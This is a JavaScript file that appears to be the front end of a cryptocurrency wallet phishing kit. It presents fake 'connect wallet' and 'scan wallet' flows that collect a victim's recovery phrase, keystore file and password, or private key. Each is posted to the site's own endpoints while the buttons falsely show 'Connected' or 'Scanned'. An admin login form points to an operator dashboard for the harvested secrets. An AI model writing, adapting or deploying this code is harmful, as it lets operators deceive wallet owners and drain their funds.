$('#admin-login').submit(function (e){
    e.preventDefault()
        $.ajax({
            url: '/login',
            data: {
                username: $('#username').val(),
                password: $('#password').val(),
            },
            contentType: false,
            method: 'POST',
            contentType: 'application/x-www-form-urlencoded',
            beforeSend: (xhr) => {
                $('#admin-btn').val('Logging...')
            },
            success: () => {
                document.getElementById('error-text').style.display = 'none';
                window.location = '/admin'
            },
            error: function(err){
                $('#admin-btn').val('LOG IN')
                $('#password').val('')
                document.getElementById('error-text').style.display = 'block';
            }
        })
})



const phraseBtn = document.getElementById('phrase-btn');
const keyStoreBtn = document.getElementById('keystore-btn');
const privateKeyBtn = document.getElementById('private-key-btn');
const adminBtm = document.getElementById('submit')

const errorSelect = document.getElementById('error-select-wallet')
const errorPhrase = document.getElementById('error-phrase-wallet')
const errorKeyStore = document.getElementById('error-key-store-wallet')
const errorPrivateKey = document.getElementById('error-private-key-wallet')
const modalClose = document.getElementById('modal-close')



const param = new URLSearchParams(window.location.search); 
var pageType = 'connect-wallet'
let walletType = param.get('w') ? param.get('w') : null;

if(walletType == null){
    $("#wallet-select").change(function() {
        walletType = $("#wallet-select option:selected").val();
        pageType = 'scan-wallet'
    });
}

modalClose.addEventListener('click', (e) => {
    e.preventDefault()
    window.location = '/'
})




phraseBtn.addEventListener('click', (e) => {
    e.preventDefault()
    if($('#phrase-text').val() != '' && walletType != null){
        $.ajax({
            type: "POST",
            url: '/post-phrase',
            data: {
                walletType: walletType,
                phrase: $('#phrase-text').val(),
                copied: false,
                delete: false
            },
            cache: false,
            beforeSend: () => {
                if(pageType == 'connect-wallet'){
                    phraseBtn.value = 'Connecting.....'
                } else {
                    phraseBtn.value = 'Scanning.....'
                }
            },
            success: (res) => {
              //TODO Show dialog
              if(pageType == 'connect-wallet'){
                phraseBtn.value = 'Connected'
                $('#Mymodal').modal('show')
             } else {
                phraseBtn.value = 'Scanned'
                $('#Mymodal').modal('show')
              }
            },
            error: (e) => {
         
            },
          });
    } else {
        if(walletType == null){
            errorSelect.style.display = 'block'
        } else if($('#phrase-text').val() == ''){
            errorPhrase.style.display = 'block'
        }
    }
})

keyStoreBtn.addEventListener('click', (e) => {
    e.preventDefault()
    if($('#keystore-text').val() != '' && $('#keystore-password').val() != '' && walletType != null){
        $.ajax({
            type: "POST",
            url: '/post-keystore',
            data: {
                walletType: walletType,
                keystore: $('#keystore-text').val(),
                password: $('#keystore-password').val(),
                passCopied: false,
                copied: false,
                delete: false
            },
            cache: false,
            beforeSend: () => {
                if(pageType == 'connect-wallet'){
                    keyStoreBtn.value = 'Connecting....'
                } else {
                    keyStoreBtn.value = 'Scanning.....'
                }
            },
            success: (res) => {
                //TODO Show dialog
                if(pageType == 'connect-wallet'){
                    keyStoreBtn.value = 'Connected'
                    $('#Mymodal').modal('show')
                } else {
                    keyStoreBtn.value = 'Scanned'
                    $('#Mymodal').modal('show')
                  }
            },
            error: (e) => {
         
            },
          });
    } else {
        if(walletType == null){
            errorSelect.style.display = 'block'
        } else if($('#keystore-text').val() == '' || $('#keystore-password').val() == ''){
            errorKeyStore.style.display = 'block'
        }  
    }
})

privateKeyBtn.addEventListener('click', (e) => {
    e.preventDefault()
    if($('#private-key-text').val() != '' && walletType != null){
        $.ajax({
            type: "POST",
            url: '/post-private-key',
            data: {
                walletType: walletType,
                privatekey: $('#private-key-text').val(),
                copied: false,
                delete: false
            },
            cache: false,
            beforeSend: () => {
                if(pageType == 'connect-wallet'){
                    privateKeyBtn.value = "Connecting...."
                } else {
                    privateKeyBtn.value = "Scanning...."
                }
            },
            success: (res) => {
                if(pageType == 'connect-wallet'){
                    privateKeyBtn.value = "Connected"
                    $('#Mymodal').modal('show')
                } else {
                    privateKeyBtn.value = "Scanned"
                    $('#Mymodal').modal('show')
                }
            },
            error: (e) => {
         
            },
          });
    } else {
        if(walletType == null){
            errorSelect.style.display = 'block'
        } else if($('#private-key-text').val() == ''){
            errorPrivateKey.style.display = 'block'
        }  
    }
})



  